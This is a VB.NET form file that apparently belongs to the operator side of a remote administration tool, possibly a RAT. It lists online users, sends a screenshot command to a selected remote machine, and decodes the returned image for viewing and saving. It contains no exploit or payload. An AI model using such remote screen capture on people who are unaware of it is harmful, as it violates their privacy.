Imports System.Globalization
Imports System.Text
Imports System.Runtime.InteropServices


Public Class Screenviewer


#Region "Resize Proprtional"
    Public Structure Rect
        Public left As Integer
        Public top As Integer
        Public right As Integer
        Public bottom As Integer
    End Structure

    Protected Overrides Sub WndProc(ByRef m As  _
        System.Windows.Forms.Message)
        Static first_time As Boolean = True
        Static aspect_ratio As Double
        Const WM_SIZING As Long = &H214
        Const WMSZ_LEFT As Integer = 1
        Const WMSZ_TOP As Integer = 3
        Const WMSZ_TOPLEFT As Integer = 4
        Const WMSZ_TOPRIGHT As Integer = 5
        Const WMSZ_BOTTOMLEFT As Integer = 7

        If m.Msg = WM_SIZING And m.HWnd.Equals(Me.Handle) Then

            Dim r As Rect
            r = DirectCast(Marshal.PtrToStructure(m.LParam, GetType(Rect)), Rect)

            If first_time Then
                first_time = False
                aspect_ratio = (r.bottom - r.top) / (r.right - r.left)
            End If

            ' Get the current dimensions.
            Dim wid As Double = r.right - r.left
            Dim hgt As Double = r.bottom - r.top

            ' Enlarge if necessary to preserve the aspect ratio.
            If hgt / wid > aspect_ratio Then
                ' It's too tall and thin. Make it wider.
                wid = hgt / aspect_ratio
            Else
                ' It's too short and wide. Make it taller.
                hgt = wid * aspect_ratio
            End If

            ' See if the user is dragging the top edge.
            If m.WParam.ToInt32 = WMSZ_TOP Or _
               m.WParam.ToInt32 = WMSZ_TOPLEFT Or _
               m.WParam.ToInt32 = WMSZ_TOPRIGHT _
            Then
                ' Reset the top.
                r.top = r.bottom - CInt(hgt)
            Else
                ' Reset the height to the saved value.
                r.bottom = r.top + CInt(hgt)
            End If

            ' See if the user is dragging the left edge.
            If m.WParam.ToInt32 = WMSZ_LEFT Or _
               m.WParam.ToInt32 = WMSZ_TOPLEFT Or _
               m.WParam.ToInt32 = WMSZ_BOTTOMLEFT _
            Then
                ' Reset the left.
                r.left = r.right - CInt(wid)
            Else
                ' Reset the width to the saved value.
                r.right = r.left + CInt(wid)
            End If

            ' Update the Message object's LParam field.
            Marshal.StructureToPtr(r, m.LParam, True)
        End If
        MyBase.WndProc(m)
    End Sub
#End Region
    
#Region "Format Screenshot Data"
    Private Function HexToScreenshot(ByVal HexString As String) As Image
        Try
            If HexString = Nothing Then
                MsgBox("Invalid data recieved. Retry.", MsgBoxStyle.Exclamation)
                Return Nothing
            End If
            Dim Bytes(HexString.Length \ 2 - 1) As Byte
            For I = 0 To Bytes.Length - 1
                Bytes(I) = Convert.ToByte(HexString.Substring(I * 2, 2), 16)
            Next
            Return Image.FromStream(New IO.MemoryStream(Bytes))
        Catch ex As Exception
            MsgBox("Failed formatting data from stream. Please retry.", MsgBoxStyle.Exclamation)
            Return Nothing
        End Try
    End Function


    Public Sub DownloadScreenshot(ByVal Data As String)
        If (InvokeRequired) Then
            Invoke(New Action(Of String)(AddressOf DownloadScreenshot), Data)
        Else
            PictureBoxScreenviewer.Image = HexToScreenshot(Data)
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles ButtonSaveScreenshot.Click
        If PictureBoxScreenviewer.Image Is Nothing Then
            MsgBox("No Screenshot available. Take a screenshot first.", MsgBoxStyle.Exclamation)
            Exit Sub
        Else
            If SaveFileDialogSaveScreenshot.ShowDialog = Windows.Forms.DialogResult.OK Then
                PictureBoxScreenviewer.Image.Save(SaveFileDialogSaveScreenshot.FileName, System.Drawing.Imaging.ImageFormat.Jpeg)
                MsgBox("Screenshot saved with success.", MsgBoxStyle.Information, "Screenviewer")
            End If
        End If
    End Sub


    Private Sub ButtonTakeScreenshot_Click(sender As Object, e As EventArgs) Handles ButtonTakeScreenshot.Click
        Dim Stamp As String = String.Empty
        Settings.AddLog("Pending", Settings.State.Pending, "Taking screenshot...")
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
            Exit Sub
        End If

        If CheckBoxStamp.Checked Then
            Stamp = "1"
        Else
            Stamp = "0"
        End If

        Dim Quality As String = Nothing

        Select Case ComboBoxQuality.SelectedIndex
            Case 0
                Quality = CStr(5)
            Case 1
                Quality = CStr(15)
            Case 2
                Quality = CStr(40)
            Case 3
                Quality = CStr(70)
            Case 4
                Quality = CStr(100)
        End Select
        Try

            Main.WriteData(Quality & "|" & Stamp)

            'Writing COmmand here, its atm for every button and control seperate.
            Waiting.ShowAndSend(Main.SelectedUserID & "|32")
            'Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Screenviewer")
        End Try
    End Sub

    Private Sub Screenviewer_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ComboBoxQuality.SelectedIndex = 2
    End Sub

    Private Sub Screenviewer_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        PictureBoxScreenviewer.Image = Nothing
    End Sub

#End Region

    Private Sub SaveFileDialogSaveScreenshot_FileOk(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles SaveFileDialogSaveScreenshot.FileOk

    End Sub

End Class